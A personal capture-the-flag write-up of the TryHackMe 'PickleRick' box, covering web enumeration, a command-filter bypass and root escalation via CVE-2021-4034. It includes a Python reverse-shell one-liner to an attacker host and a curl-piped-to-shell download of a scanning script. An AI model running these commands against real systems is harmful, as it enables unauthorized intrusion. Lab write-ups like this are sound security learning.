## TryHackMe - PickleRick
> Completed 1st November  2021. Revisited 30th August 2022.

A Rick and Morty themed box that I had completed the year before but never got around to documenting. Revisiting this box interested me in the sense that I had completely forgot how I had enumerated it originally. So, it was great to relearn some techniques.

---
### Environment
#### Operating System
- Latest kali-VM rolling update

#### Tools
- Nmap
- Nikto
- Gobuster
- Netcat
- Linpeas.sh ([source](https://github.com/carlospolop/PEASS-ng))

---
### Methodology
#### Objectives/Flags
1. What is the first ingredient Rick needs?
2. What's the second ingredient Rick needs?
3. What's the final ingredient Rick needs?

---
#### Reconnaissance
First things first, I ran an `nmap` scan to find open ports.
```bash
nmap -T4 -sV <TargetIP>
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We can see an open web server which we can navigate to through our browser.
```
http://<TargetIP>/
```
From here we can begin crawling the source code.
```
Note to self, remember username! Username: R1ckRul3s
```
We've found a potential username. What it belongs to is still unknown. The site is simple and runs in html so there's not much more I can try to search for. I start fuzzing for directories using `GoBuster` . 
```bash
gobuster dir --url http://<TargetIP>/ -w <Wordlist> > <Output.txt> -t 100 --timeout 20s
  /robots.txt           (Status: 200) [Size: 17] 
  /login.php            (Status: 200) [Size: 882] 
  /assets              (Status: 301) [Size: 313]
```
Here I found an `assets` directory which doesn't seem to have any files of interest other than miscellaneous image files. Although, some of these files aren't found on the index.html page giving us the hint that there's more pages to find.
```
http://<TargetIP>/robots.txt
  Wubbalubbadubdub
```
The robots file gives us an interesting string we can save for later.
```
http://<TargetIP>/login.php
```
The login page was not found until after a good deal of time enumerating elsewhere as I had failed to account for the fact that my regular wordlist did not fuzz for files. It was upon using `Nikto` for the first time that I was hinted at this lapse of enumeration.
```bash
nikto -h <TargetIP> -p 80
```
```
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Cookie PHPSESSID created without the httponly flag
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
```
Most the output of `Nitko` didn't aid me in my reconnaissance and lead me to dead ends (Atleast, it appeared that way to my limited abilities) however, it showed me that there was an `login.php` which I had not found earlier using `Gobuster`.

At the login page it was time to enter the data that we had sourced from earlier.
```
Username: R1ckRu3s
Password: Wubbalubbadubdub
```
We've made into the administrator’s's console. It appears we don't have permission to access the other various tabs and only the console. We can start testing inputs.
```bash
ls
assets
  clue.txt
  denied.php
  index.html
  login.php
  portal.php
  robots.txt
  Sup3rS3cretPickl3Ingred.txt
```
```bash
cat Sup3rS3cretPickl3Ingred.txt
  Command disabled
```
We find that several commands have been disabled, specifically those that are needed to print the contents of files such as `nano`, `vim`, `cat` and `tail` etc. I was curious to know if there was a way to get around this but there was no clear way to get the contents of the PHP files to better understand the filtering. A google searched revealed the `tac` command which essentially does the same thing as `cat` and upon testing the command we were successfully able to print out contents. I found this interesting as I didn't know that this command existed and I'm not sure if it's a regular command that's available.
```bash
tac Sup3rS3cretPickl3Ingred.txt
   {***}
```
The first flag has been found. With the `tac` command discovered we can further search the filesystem for loot. After some time, we can find the second flag in the home directory of the user `Rick`.
```bash
tac /home/rick/second ingredients
  1 jerry tear
```
After spending some more time searching the file system, I don't turn up anything of interest. We need to get a foothold into the server to progress by searching the `/root` folder.

#### Weaponization 
N/A

#### Delivery
N/A

#### Exploitation
Through command testing we can discover that python is installed on the server, and we can initiate a reverse shell. We throw in our malicious command into the console.
```bash
nc -lvnp 1234
```
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<AttackIP>",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

#### Installation 
N/A

#### Command & Control
N/A

#### Actions on Objective
Once a foothold was established, I was able to scan the server using `Linpeas` by setting up a HTTP server on my machine and using `curl` to download it.
```bash
python3 -m http.server 4443 --directory <sharedfile>
```
```bash
curl http://<LocalIP>/linpeas.sh | sh
```
The results show us that the server is vulnerable for `CVE-2021-4034` which we can exploit using a script found on `ExploitDB` [here](https://www.exploit-db.com/exploits/50689).
By downloading the files on the attack machine using `wget` the directory.
```bash
wget -r <ExploitURL>
chmod +777 <ExploitDirectory>
make
./<exploit>
```
The exploit escalates us to the `root` user where we can further our search for loot.
```bash
cat /root/3rd.txt
  3rd ingredients: ***
```
With all the flags found, the box was complete.

---
### After-action
#### What I've learned
Using `Nikto` for the first time highlighted my lack of proper wordlist usage in terms of enumerating for files and not just directories. I've started making new notes in my knowledge base to better playbook my usage and apply the relevant wordlists when needed. In addition, I've found the `tac` command which I may be able to leverage in future.

#### What I would've done differently
N/A
